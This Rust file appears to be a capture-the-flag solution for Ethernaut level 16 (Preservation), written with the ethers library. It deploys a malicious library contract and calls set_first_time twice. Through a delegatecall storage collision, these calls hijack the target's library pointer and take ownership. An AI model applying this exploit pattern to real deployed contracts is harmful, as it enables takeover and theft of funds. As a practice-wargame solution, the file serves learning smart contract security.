use crate::abi::i_am_true_library_contract_please_believe_me::IAmTrueLibraryContractPleaseBelieveMe;
use async_trait::async_trait;
use ctf::ethernaut::lvl16_preservation::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Preservation::new(target.address, offender.clone());
        let hack_contract = IAmTrueLibraryContractPleaseBelieveMe::deploy(
            offender.to_owned(),
            target.address,
        )?
        .send()
        .await?;
        let address_hack_uint256 = hack_contract
            .address_to_uint_256(hack_contract.address())
            .call()
            .await?;
        let address_uint256 = hack_contract
            .address_to_uint_256(offender.address())
            .call()
            .await?;

        contract.set_first_time(address_hack_uint256).send().await?;
        contract.set_first_time(address_uint256).send().await?;
        Ok(())
    }
}
